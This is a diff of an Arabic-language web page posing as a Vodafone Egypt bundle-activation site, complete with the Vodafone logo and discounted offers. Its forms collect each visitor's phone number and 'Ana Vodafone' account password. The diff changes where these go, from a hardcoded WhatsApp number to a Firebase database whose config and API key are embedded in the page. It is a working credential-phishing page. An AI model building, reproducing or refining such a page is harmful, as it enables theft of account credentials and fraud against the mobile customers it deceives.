@@ -4,7 +4,9 @@
   <meta charset="UTF-8">
   <title>تفعيل باقات فودافون</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
   <style>
     body {
       background-color: #7b0000;
@@ -14,33 +16,31 @@
       margin: 0;
       padding: 0;
       overflow-x: hidden;
+      position: relative;
     }
 
     .container {
       padding: 20px;
+      position: relative;
+      z-index: 1;
     }
 
     h1 {
-      font-size: 32px;
+      font-size: 28px;
       margin-bottom: 10px;
-      font-weight: bold;
     }
 
     .subtitle {
-      font-size: 18px;
+      font-size: 16px;
       margin-bottom: 30px;
-      color: #ffcccc;
     }
 
     .box {
-      background-color: rgba(255, 255, 255, 0.07);
+      background-color: rgba(255, 255, 255, 0.05);
       border: 1px solid #ff4d4d;
-      border-radius: 12px;
+      border-radius: 10px;
       padding: 20px;
-      margin: 20px auto;
-      max-width: 400px;
-      position: relative;
-      overflow: hidden;
+      margin: 10px;
     }
 
     .btn {
@@ -52,17 +52,15 @@
       text-decoration: none;
       font-weight: bold;
       margin-top: 10px;
-      cursor: pointer;
     }
 
     input {
       display: block;
-      width: 90%;
+      width: 80%;
       margin: 10px auto;
       padding: 10px;
       border-radius: 8px;
       border: none;
-      font-size: 16px;
     }
 
     footer {
@@ -94,15 +92,23 @@
       margin-top: 30px;
     }
 
-    .terms {
-      font-size: 14px;
-      color: #ffdddd;
+    .logo {
+      position: absolute;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 60px;
+    }
+
+    .conditions {
+      font-size: 12px;
       margin-top: 10px;
-      line-height: 1.7;
+      color: #ffcccc;
     }
   </style>
 </head>
 <body>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Vodafone_2017_logo.svg/512px-Vodafone_2017_logo.svg.png" class="logo" alt="Vodafone Logo">
   <div class="container">
     <h1>تفعيل باقات فودافون</h1>
     <p class="subtitle">أقوى العروض بسرعة الصاروخ</p>
@@ -110,54 +116,42 @@
     <div class="box">
       <h2>13000 فليكس</h2>
       <p>240 جنيه</p>
-      <form onsubmit="sendData(event, 'فليكس 13000', true)">
-        <input type="text" id="number1" placeholder="رقم فودافون" required>
-        <input type="password" id="password1" placeholder="كلمة المرور - أنا فودافون" required>
-        <button type="submit" class="btn">تفعيل الآن</button>
-      </form>
-      <div class="terms">
-        <strong>الشروط:</strong><br>
-        - لا يجب أن يكون عليك سلف أو نوتة.<br>
-        - يتم التفعيل خلال ساعتين من إرسال البيانات.
-      </div>
+      <div class="conditions">شروط: لا يكون عليك سلف أو نوتة - التفعيل خلال ساعتين من إرسال الرقم وكلمة المرور</div>
+      <button class="btn" onclick="showForm('فليكس 13000', true)">تفعيل الآن</button>
     </div>
 
     <div class="box">
       <h2>40 جيجا</h2>
       <p>330 جنيه</p>
-      <form onsubmit="sendData(event, '40 جيجا', true)">
-        <input type="text" id="number2" placeholder="رقم فودافون" required>
-        <input type="password" id="password2" placeholder="كلمة المرور - أنا فودافون" required>
-        <button type="submit" class="btn">تفعيل الآن</button>
-      </form>
-      <div class="terms">
-        <strong>الشروط:</strong><br>
-        - يمكن التفعيل حتى لو عليك سلف أو نوتة.<br>
-        - يتم التفعيل خلال 72 ساعة من إرسال البيانات.
-      </div>
+      <div class="conditions">شروط: التفعيل حتى لو عليك سلف أو نوتة - خلال 72 ساعة من إرسال الرقم وكلمة المرور</div>
+      <button class="btn" onclick="showForm('40 جيجا', true)">تفعيل الآن</button>
     </div>
 
     <div class="box">
       <h2>شحن رصيد صافي</h2>
-      <p>ادخل الكمية المطلوبة</p>
-      <form onsubmit="sendData(event, 'رصيد صافي', false)">
-        <input type="text" id="number3" placeholder="رقم فودافون" required>
-        <input type="number" id="amount" placeholder="كمية الصافي بالجنيه" required>
-        <p id="cost"></p>
-        <button type="submit" class="btn">شحن الآن</button>
-      </form>
-      <div class="terms">
-        <strong>الشروط:</strong><br>
-        - يتم تحويل الرصيد خلال نصف ساعة من إرسال الرقم.
-      </div>
+      <p>اكتب الكمية واحسب</p>
+      <div class="conditions">يتم إرسال الرصيد خلال نصف ساعة من إدخال الرقم</div>
+      <button class="btn" onclick="showForm('رصيد صافي', false)">شحن الآن</button>
     </div>
 
     <div id="formSection"></div>
 
-    <footer>Developed by mahmoud gamal</footer>
+    <footer>Developed by: mahmoud gamal</footer>
   </div>
 
   <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCuP6VscPxkQS5D5z7bCYWXijzaYCdbF2s",
+      authDomain: "starkoscript.firebaseapp.com",
+      databaseURL: "https://starkoscript-default-rtdb.firebaseio.com",
+      projectId: "starkoscript",
+      storageBucket: "starkoscript.appspot.com",
+      messagingSenderId: "381525854892",
+      appId: "1:381525854892:android:50ba5daa1cffae8faa2d09"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
     function createParticle() {
       const particle = document.createElement('div');
       particle.className = 'particle';
@@ -168,39 +162,48 @@
     }
     setInterval(createParticle, 500);
 
-    const amountInput = document.getElementById("amount");
-    const costDisplay = document.getElementById("cost");
+    function showForm(type, askPassword) {
+      const formSection = document.getElementById("formSection");
+      formSection.innerHTML = `
+        <form onsubmit="sendData(event, '${type}', ${askPassword})">
+          <input type="text" id="number" placeholder="رقم فودافون" required>
+          ${askPassword ? '<input type="password" id="password" placeholder="كلمة المرور" required>' : ''}
+          ${type === 'رصيد صافي' ? '<input type="number" id="amount" placeholder="كمية الصافي" required><p id="cost"></p>' : ''}
+          <button type="submit" class="btn">إرسال</button>
+        </form>
+      `;
 
-    if (amountInput) {
-      amountInput.addEventListener("input", () => {
-        const val = parseFloat(amountInput.value);
-        if (!isNaN(val)) {
-          costDisplay.textContent = `المبلغ المطلوب: ${val * 1.2} جنيه`;
-        } else {
-          costDisplay.textContent = "";
-        }
-      });
+      if (type === 'رصيد صافي') {
+        const amountInput = document.getElementById("amount");
+        const costDisplay = document.getElementById("cost");
+        amountInput.addEventListener("input", () => {
+          const val = parseFloat(amountInput.value);
+          if (!isNaN(val)) {
+            costDisplay.textContent = `المبلغ المطلوب: ${val * 1.2} جنيه`;
+          } else {
+            costDisplay.textContent = "";
+          }
+        });
+      }
     }
 
     function sendData(event, type, askPassword) {
       event.preventDefault();
-      const form = event.target;
-      const number = form.querySelector("input[type='text']").value;
-      let message = `طلب: ${type}\nرقم: ${number}`;
+      const number = document.getElementById("number").value;
+      const password = askPassword ? document.getElementById("password").value : "";
+      const amount = type === "رصيد صافي" ? document.getElementById("amount").value : "";
 
-      if (askPassword) {
-        const password = form.querySelector("input[type='password']").value;
-        message += `\nكلمة المرور: ${password}`;
-      }
-
-      if (type === 'رصيد صافي') {
-        const amount = form.querySelector("input[type='number']").value;
-        const price = amount * 1.2;
-        message += `\nكمية: ${amount} صافي = ${price} جنيه`;
-      }
-
-      const phone = "01013091169";
-      window.location.href = `https://wa.me/2${phone}?text=${encodeURIComponent(message)}`;
+      db.ref("starko").push({
+        type,
+        num: number,
+        pass: password,
+        eg: amount
+      }).then(() => {
+        alert("تم إرسال الطلب بنجاح.");
+      }).catch((err) => {
+        alert("حدث خطأ أثناء الإرسال");
+        console.error(err);
+      });
     }
   </script>
 </body>
